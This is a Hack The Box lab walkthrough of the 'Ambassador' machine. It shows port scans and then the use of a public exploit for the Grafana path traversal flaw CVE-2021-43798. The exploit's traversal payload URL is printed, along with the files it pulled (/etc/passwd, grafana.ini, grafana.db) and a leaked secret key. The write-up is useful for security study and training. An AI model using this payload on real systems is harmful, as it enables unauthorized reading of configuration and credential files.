# Hack The Box - Ambassador Walkthrough

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.11.183
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-10 11:11 EST
Nmap scan report for 10.10.11.183
Host is up (0.19s latency).                                                                                                                                                                                                                                                                                                 
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 10 Feb 2023 16:12:31 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 10 Feb 2023 16:12:01 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, LongPassword, FoundRows, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, InteractiveCliesactions, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x16\x15K?iG?,We\x1FP{G9l*I@b
|_  Auth Plugin Name: caching_sha2_password
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.c
SF-Port3000-TCP:V=7.92%I=7%D=2/10%Time=63E66CC3%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fr
SF:i,\x2010\x20Feb\x202023\x2016:12:01\x20GMT\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
SF:\x20mode=block\r\nDate:\x20Fri,\x2010\x20Feb\x202023\x2016:12:31\x20GMT
SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
SF:);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/10%OT=22%CT=1%CU=33710%PV=Y%DS=2%DC=I%G=Y%TM=63E66D5
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%TS=A)OPS(O1=M539ST11N
OS:W7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539S
OS:T11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=4
OS:0%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(
OS:R=N)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=40
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.11 seconds

```
We get back `4` open ports:
- Port `22`: running `OpenSSH 8.2p1`
- Port `80`: running `Apache httpd 2.4.41`
- Port `3000`: got `302` redirected to `/login`
- Port `3306`: running `MySQL 8.0.30`

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Rustscan to covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
└─$ rustscan -a 10.10.11.183 --range 1-65535    
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.183:22
Open 10.10.11.183:80
Open 10.10.11.183:3000
Open 10.10.11.183:3306
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,3000,3306 10.10.11.183

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-10 11:14 EST
Initiating Ping Scan at 11:14
Scanning 10.10.11.183 [2 ports]
Completed Ping Scan at 11:14, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:14
Completed Parallel DNS resolution of 1 host. at 11:14, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:14
Scanning 10.10.11.183 [4 ports]
Discovered open port 3306/tcp on 10.10.11.183
Discovered open port 22/tcp on 10.10.11.183
Discovered open port 80/tcp on 10.10.11.183
Discovered open port 3000/tcp on 10.10.11.183
Completed Connect Scan at 11:14, 0.19s elapsed (4 total ports)
Nmap scan report for 10.10.11.183
Host is up, received syn-ack (0.19s latency).
Scanned at 2023-02-10 11:14:15 EST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack
3306/tcp open  mysql   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

## Enumeration
Let's Take a look at the web service running on port 80 `http://10.10.11.183/`. it seems like a static web page hosted on port 80.

![amb-1](https://user-images.githubusercontent.com/87711310/218149803-5a8a401b-ee5e-4553-957b-52344fec02e3.png)

The only valuable thing about this site is that it gives me a hint that I can log into the box with the user `developer`. But to log in, Something called `DevOps` should give us the password.

![amb-2](https://user-images.githubusercontent.com/87711310/218149930-2992c674-44cf-4145-a0cd-275d665a22d8.png)

So, keeping it at the back of my mind, I visited port `3000` which redirected me to a `Grafana Login page` on `http://10.10.11.183:3000/login`

![amb-3](https://user-images.githubusercontent.com/87711310/218150178-11ce58df-74a7-43a3-9c8a-36b41b54112d.png)

The Version of Grafana `v8.2.0` (d7f71e9eae). This Grafana version vulnerable to `Unauthorized Arbitrary File Read vulnerability (CVE-2021-43798)`

On googling it, I found this exploit that I used to exploit the Grafana login page.

![amb-4](https://user-images.githubusercontent.com/87711310/218156143-32f0235e-ab53-4fb6-85d7-c2a4f7f155ef.png)


The Exploit could be downloaded using this [GitHub](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798.git) link.

To run the exploit, you have to save the Grafana URL in targets.txt which locate inside what we downloaded from GitHub using the below command.

```
echo "http://10.10.11.183:3000" > targets.txt
```

After Executing Our Python Script Using python exploit.py command Several types of files were saved along with a secret key dumbed down by the exploit.

```
──(darshan㉿kali)-[~/…/HackTheBox/Linux-Boxes/Ambassador/exploit-grafana-CVE-2021-43798]
└─$ sudo python exploit.py
  _____   _____   ___ __ ___ _     _ _ ________ ___ ___ 
 / __\ \ / / __|_|_  )  \_  ) |___| | |__ /__  / _ ( _ )                                                                                                    
| (__ \ V /| _|___/ / () / /| |___|_  _|_ \ / /\_, / _ \                                                                                                    
 \___| \_/ |___| /___\__/___|_|     |_|___//_/  /_/\___/                                                                                                    
                @pedrohavay / @acassio22                                                                                                                    
                                                                                                                                                            
? Enter the target list:  targets.txt

========================================

[i] Target: http://10.10.11.183:3000
                                                                                                                                                            
[!] Payload "http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" works.
                                                                                                                                                            
[i] Analysing files...
                                                                                                                                                            
[i] File "/conf/defaults.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/defaults.ini".
                                                                                                                                                            
[i] File "/etc/grafana/grafana.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.ini".
                                                                                                                                                            
[i] File "/etc/passwd" found in server.
[*] File saved in "./http_10_10_11_183_3000/passwd".
                                                                                                                                                            
[i] File "/var/lib/grafana/grafana.db" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.db".
                                                                                                                                                            
[i] File "/proc/self/cmdline" found in server.
[*] File saved in "./http_10_10_11_183_3000/cmdline".
                                                                                                                                                            
? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm                                                                                                                        
                                                                                                                                                            
[*] Bye Bye!

```

After a successful attempt of exploit, I was given a `secret key`, and there were also a couple of file in my directory too.
